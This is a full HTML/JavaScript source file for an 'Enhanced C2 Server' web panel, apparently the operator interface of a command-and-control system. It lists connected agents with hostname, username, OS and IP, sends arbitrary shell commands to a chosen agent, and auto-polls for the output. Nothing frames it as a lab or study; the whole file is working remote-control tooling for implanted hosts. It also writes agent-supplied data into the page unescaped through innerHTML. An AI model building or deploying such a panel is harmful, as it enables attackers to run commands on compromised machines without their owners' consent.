<!DOCTYPE html>
<html>
<head>
    <title>Enhanced C2 Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #007bff; color: white; padding: 20px; border-radius: 8px; text-align: center; }
        .stat-number { font-size: 2em; font-weight: bold; }
        .section { margin-bottom: 30px; }
        .section h2 { border-bottom: 2px solid #007bff; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f8f9fa; }
        .btn { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
        .btn:hover { background: #0056b3; }
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #c82333; }
        .command-input { width: 70%; padding: 10px; margin-right: 10px; }
        .log { background: #f8f9fa; padding: 15px; border-radius: 4px; max-height: 300px; overflow-y: auto; font-family: monospace; }
        .status { padding: 10px; margin: 10px 0; border-radius: 4px; }
        .status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Enhanced C2 Server</h1>
            <p>Command and Control Server Management Interface</p>
        </div>
        
        <div id="status" class="status" style="display: none;"></div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="agent-count">0</div>
                <div>Active Agents</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="command-count">0</div>
                <div>Commands Executed</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="success-rate">0%</div>
                <div>Success Rate</div>
            </div>
        </div>

        <div class="section">
            <h2>Active Agents</h2>
            <button class="btn" onclick="loadAgents()" style="background: #28a745;">Load Agents</button>
            <table id="agents-table">
                <thead>
                    <tr>
                        <th>Agent ID</th>
                        <th>Hostname</th>
                        <th>Username</th>
                        <th>OS</th>
                        <th>IP Address</th>
                        <th>Last Seen</th>
                        <th>Status</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="agents-tbody">
                </tbody>
            </table>
        </div>

        <div class="section">
            <h2>Command Execution</h2>
            <div>
                <select id="agent-select" style="padding: 10px; margin-right: 10px;">
                    <option value="">Select Agent</option>
                </select>
                <input type="text" id="command-input" class="command-input" placeholder="Enter command...">
                <button class="btn" onclick="executeCommand()">Execute</button>
                <button class="btn" onclick="refreshResults()" style="background: #28a745;">Refresh Results</button>
            </div>
            <div id="command-results" class="log" style="margin-top: 20px;"></div>
        </div>
    </div>

    <script>
        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status ' + type;
            status.style.display = 'block';
            setTimeout(() => {
                status.style.display = 'none';
            }, 3000);
        }

        function loadAgents() {
            console.log('Loading agents...');
            showStatus('Loading agents...', 'success');
            
            fetch('/api/agents')
                .then(response => {
                    console.log('Agents response status:', response.status);
                    if (!response.ok) {
                        throw new Error('HTTP ' + response.status);
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Agents data received:', data);
                    updateAgentsTable(data.agents);
                    updateStats({
                        agents: data.agents,
                        command_count: 0,
                        success_rate: '100%'
                    });
                    showStatus('Agents loaded successfully!', 'success');
                })
                .catch(error => {
                    console.error('Error loading agents:', error);
                    showStatus('Error loading agents: ' + error.message, 'error');
                });
        }

        function updateAgentsTable(agents) {
            console.log('Updating agents table with:', agents);
            const tbody = document.getElementById('agents-tbody');
            const select = document.getElementById('agent-select');
            
            if (!tbody || !select) {
                console.error('Could not find agents table or select element');
                return;
            }
            
            tbody.innerHTML = '';
            select.innerHTML = '<option value="">Select Agent</option>';
            
            const agentValues = Object.values(agents);
            console.log('Processing', agentValues.length, 'agents');
            
            if (agentValues.length === 0) {
                const row = tbody.insertRow();
                row.innerHTML = '<td colspan="8" style="text-align: center; color: #666;">No agents connected</td>';
                return;
            }
            
            agentValues.forEach(agent => {
                console.log('Adding agent:', agent.agent_id);
                const row = tbody.insertRow();
                row.innerHTML = `
                    <td>${agent.agent_id}</td>
                    <td>${agent.hostname}</td>
                    <td>${agent.username}</td>
                    <td>${agent.os_info}</td>
                    <td>${agent.ip_address}</td>
                    <td>${new Date(agent.last_seen).toLocaleString()}</td>
                    <td><span style="color: green;">Online</span></td>
                    <td>
                        <button class="btn btn-danger" onclick="removeAgent('${agent.agent_id}')">Remove</button>
                    </td>
                `;
                
                const option = document.createElement('option');
                option.value = agent.agent_id;
                option.textContent = agent.agent_id;
                select.appendChild(option);
            });
            
            console.log('Agents table updated successfully');
        }

        function updateStats(data) {
            const agentCount = Object.keys(data.agents || {}).length;
            document.getElementById('agent-count').textContent = agentCount;
            document.getElementById('command-count').textContent = data.command_count || 0;
            document.getElementById('success-rate').textContent = data.success_rate || '0%';
        }

        function executeCommand() {
            const agentId = document.getElementById('agent-select').value;
            const command = document.getElementById('command-input').value;
            
            if (!agentId || !command) {
                alert('Please select an agent and enter a command');
                return;
            }
            
            fetch('/api/commands/execute', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    agent_id: agentId,
                    command: command,
                    command_type: 'shell'
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Command executed:', data);
                showStatus('Command executed successfully! Waiting for results...', 'success');
                
                // Start polling for results
                pollCommandResults(agentId);
            })
            .catch(error => {
                console.error('Command execution error:', error);
                showStatus('Command execution failed: ' + error.message, 'error');
            });
            
            document.getElementById('command-input').value = '';
        }

        function pollCommandResults(agentId) {
            console.log('Polling for command results...');
            
            fetch(`/api/commands/${agentId}/results`)
                .then(response => response.json())
                .then(data => {
                    console.log('Command results:', data);
                    displayCommandResults(data.results);
                })
                .catch(error => {
                    console.error('Error fetching command results:', error);
                });
        }

        function displayCommandResults(results) {
            const log = document.getElementById('command-results');
            
            if (results.length === 0) {
                log.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">No command results yet. Commands may take a few seconds to execute.</div>';
                return;
            }
            
            log.innerHTML = '';
            
            results.forEach(result => {
                const timestamp = new Date(result.timestamp).toLocaleString();
                const formattedResult = result.result
                    .replace(/\n/g, '<br>')
                    .replace(/\t/g, '&nbsp;&nbsp;&nbsp;&nbsp;')
                    .replace(/ /g, '&nbsp;');
                
                const resultDiv = document.createElement('div');
                resultDiv.style.cssText = 'margin-bottom: 15px; border-left: 3px solid #007bff; padding-left: 10px;';
                
                resultDiv.innerHTML = `
                    <div style="font-weight: bold; color: #007bff; margin-bottom: 5px;">
                        [${timestamp}] Agent: ${result.agent_id} - ${result.success ? 'SUCCESS' : 'FAILED'}
                    </div>
                    <div style="background: #ffffff; padding: 10px; border-radius: 4px; border: 1px solid #dee2e6; white-space: pre-wrap; font-family: monospace; font-size: 13px; line-height: 1.4;">
                        ${formattedResult}
                    </div>
                `;
                
                log.appendChild(resultDiv);
            });
            
            log.scrollTop = log.scrollHeight;
        }

        function removeAgent(agentId) {
            if (confirm('Are you sure you want to remove this agent?')) {
                fetch(`/api/agents/${agentId}`, { method: 'DELETE' })
                    .then(() => {
                        showStatus('Agent removed successfully!', 'success');
                        loadAgents(); // Reload the list
                    })
                    .catch(error => {
                        console.error('Error removing agent:', error);
                        showStatus('Error removing agent: ' + error.message, 'error');
                    });
            }
        }

        function refreshResults() {
            const agentSelect = document.getElementById('agent-select');
            if (agentSelect.value) {
                console.log('Refreshing command results...');
                pollCommandResults(agentSelect.value);
                showStatus('Command results refreshed!', 'success');
            } else {
                showStatus('Please select an agent first', 'error');
            }
        }

        // Auto-refresh command results every 3 seconds
        function startAutoRefresh() {
            setInterval(() => {
                const agentSelect = document.getElementById('agent-select');
                if (agentSelect.value) {
                    pollCommandResults(agentSelect.value);
                }
            }, 3000);
        }

        // Handle agent selection change
        function onAgentChange() {
            const agentSelect = document.getElementById('agent-select');
            if (agentSelect.value) {
                console.log('Agent selected:', agentSelect.value);
                pollCommandResults(agentSelect.value);
            } else {
                document.getElementById('command-results').innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">Select an agent to see command results</div>';
            }
        }

        // Load agents when page loads
        window.addEventListener('load', function() {
            console.log('Page loaded, loading agents...');
            loadAgents();
            startAutoRefresh();
            
            // Add event listener for agent selection
            const agentSelect = document.getElementById('agent-select');
            agentSelect.addEventListener('change', onAgentChange);
        });
    </script>
</body>
</html>
